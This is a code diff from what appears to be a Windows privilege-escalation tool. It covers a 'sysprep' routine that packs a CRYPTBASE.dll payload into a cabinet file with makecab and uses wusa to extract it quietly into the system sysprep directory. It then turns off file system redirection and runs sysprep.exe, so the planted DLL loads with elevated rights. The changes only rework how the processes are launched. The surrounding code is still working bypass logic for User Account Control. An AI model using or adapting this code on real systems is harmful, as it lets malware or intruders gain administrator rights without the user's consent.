@@ -33,9 +33,9 @@ def sysprep(payload):
 		time.sleep(5)
 
 		if os.path.isfile(os.path.join(tempfile.gettempdir(),"CRYPTBASE.dll")) == True:
-			if process().create("cmd.exe /c makecab {} {}".format(
+			if process().create("makecab.exe", params="{} {}".format(
 					os.path.join(tempfile.gettempdir(), "CRYPTBASE.dll"),
-					os.path.join(tempfile.gettempdir(), "suspicious.cab")), 0):
+					os.path.join(tempfile.gettempdir(), "suspicious.cab"))):
 				print_success("Successfully created cabinet file")
 			else:
 				print_success("Unable to create cabinet file")
@@ -47,9 +47,9 @@ def sysprep(payload):
 		time.sleep(5)
 
 		if os.path.isfile(os.path.join(tempfile.gettempdir(),"suspicious.cab")) == True:
-			if process().create("cmd.exe /c wusa {} /extract:{}\sysprep /quiet".format(
+			if process().create("wusa.exe", params="{} /extract:{}\sysprep /quiet".format(
 					os.path.join(tempfile.gettempdir(), "suspicious.cab"),
-					information().system_directory()), 0):
+					information().system_directory())):
 				print_success("Successfully extracted cabinet file")
 			else:
 				print_error("Unable to extract cabinet file")
@@ -63,7 +63,7 @@ def sysprep(payload):
 		print_info("Disabling file system redirection")
 		with disable_fsr():
 			print_success("Successfully disabled file system redirection")
-			if process().create("cmd.exe /c {}\sysprep\sysprep.exe".format(information().system_directory()), 0):
+			if process().create(os.path.join(information().system_directory(), 'sysprep', 'sysprep.exe')):
 				print_success("Successfully executed sysprep executable")
 				if os.path.isfile(os.path.join(tempfile.gettempdir(), "suspicious.cab")) == True:
 					try:
